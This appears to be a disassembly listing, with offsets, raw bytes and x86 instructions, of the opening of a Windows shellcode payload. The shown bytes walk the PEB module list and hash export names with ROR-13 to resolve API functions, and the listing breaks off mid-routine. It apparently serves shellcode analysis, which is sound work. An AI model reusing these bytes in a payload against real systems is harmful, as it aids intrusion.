0x0 bytearray(b'\xfc') 1  cld  
0x1 bytearray(b'\xe8\x8f\x00\x00\x00') 5  call  0x95
0x6 bytearray(b'`') 1  pushal  
0x7 bytearray(b'\x89\xe5') 2  mov  ebp, esp
0x9 bytearray(b'1\xd2') 2  xor  edx, edx
0xb bytearray(b'd\x8bR0') 4  mov  edx, dword ptr fs:[edx + 0x30]
0xf bytearray(b'\x8bR\x0c') 3  mov  edx, dword ptr [edx + 0xc]
0x12 bytearray(b'\x8bR\x14') 3  mov  edx, dword ptr [edx + 0x14]
0x15 bytearray(b'\x0f\xb7J&') 4  movzx  ecx, word ptr [edx + 0x26]
0x19 bytearray(b'1\xff') 2  xor  edi, edi
0x1b bytearray(b'\x8br(') 3  mov  esi, dword ptr [edx + 0x28]
0x1e bytearray(b'1\xc0') 2  xor  eax, eax
0x20 bytearray(b'\xac') 1  lodsb  al, byte ptr [esi]
0x21 bytearray(b'<a') 2  cmp  al, 0x61
0x23 bytearray(b'|\x02') 2  jl  0x27
0x25 bytearray(b', ') 2  sub  al, 0x20
0x27 bytearray(b'\xc1\xcf\r') 3  ror  edi, 0xd
0x2a bytearray(b'\x01\xc7') 2  add  edi, eax
0x2c bytearray(b'I') 1  dec  ecx
0x2d bytearray(b'u\xef') 2  jne  0x1e
0x2f bytearray(b'R') 1  push  edx
0x30 bytearray(b'W') 1  push  edi
0x31 bytearray(b'\x8bR\x10') 3  mov  edx, dword ptr [edx + 0x10]
0x34 bytearray(b'\x8bB<') 3  mov  eax, dword ptr [edx + 0x3c]
0x37 bytearray(b'\x01\xd0') 2  add  eax, edx
0x39 bytearray(b'\x8b@x') 3  mov  eax, dword ptr [eax + 0x78]
0x3c bytearray(b'\x85\xc0') 2  test  eax, eax
0x3e bytearray(b'tL') 2  je  0x8c
0x40 bytearray(b'\x01\xd0') 2  add  eax, edx
0x42 bytearray(b'\x8bH\x18') 3  mov  ecx, dword ptr [eax + 0x18]
0x45 bytearray(b'\x8bX ') 3  mov  ebx, dword ptr [eax + 0x20]
0x48 bytearray(b'P') 1  push  eax
0x49 bytearray(b'\x01\xd3') 2  add  ebx, edx
0x4b bytearray(b'\x85\xc9') 2  test  ecx, ecx
0x4d bytearray(b't<') 2  je  0x8b
0x4f bytearray(b'1\xff') 2  xor  edi, edi
0x51 bytearray(b'I') 1  dec  ecx
0x52 bytearray(b'\x8b4\x8b') 3  mov  esi, dword ptr [ebx + ecx*4]
